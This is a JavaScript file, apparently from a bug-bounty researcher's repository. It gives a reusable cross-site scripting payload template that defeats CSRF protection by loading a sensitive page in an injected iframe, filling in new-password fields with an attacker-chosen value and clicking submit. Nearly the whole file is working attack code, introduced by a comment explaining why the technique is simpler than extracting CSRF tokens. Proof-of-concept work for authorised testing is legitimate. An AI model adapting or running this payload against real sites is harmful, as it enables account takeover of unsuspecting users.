/*
After releasing this repository, I was contacted by Justin Gardner (@Rhynorater), an excellent security researcher and bug bounty hunter. He shared a different technique with me which allows an XSS to bypass CSRF by injecting an iframe into the page and submitting the sensitive form within the iframe.

This is an excellent technique, and simplifies the process of creating custom payloads for many web applications. A template for this technique can be seen below, the script will create an iframe which loads https://example.com/sensitive/action.php. It will then fill out the NewPassword and ConfirmNewPassword text boxes with the value "1337H4x0rz!!!" and click the submit button.

With this technique, there is no need to extract the CSRF token because it's already embedded in the form.

It is important to know how both of these techniques work. AJAX requests can be the only option sometimes, like when we're dealing with an API that isn't UI accessible. It can also be more reliable if the victim has a slow internet connection. On the other hand, this iframe method is a much simpler payload, and makes it easy to rapidly develop a PoC for a custom application.
*/


frame=document.createElement("iframe")
frame.addEventListener("load", function() {
    // Wait 1 second after the iframe loads to ensure that the DOM has loaded
    setTimeout(function(){
        //Set new password
        frame.contentDocument.getElementById("NewPassword").value="1337H4x0rz!!!"
        //Set confirm password
        frame.contentDocument.getElementById("ConfirmNewPassword").value="1337H4x0rz!!!"
        //Click the submit button
        frame.contentDocument.getElementById("SubmitButton").click()
        setTimeout(function(){
            //Wait a couple seconds for the previous request to be sent
            alert("Your account password has been changed to 1337H4x0rz!!!")
        }, 2000)
    }, 1000)
});

frame.src="https://example.com/sensitive/action.php"
document.body.append(frame)
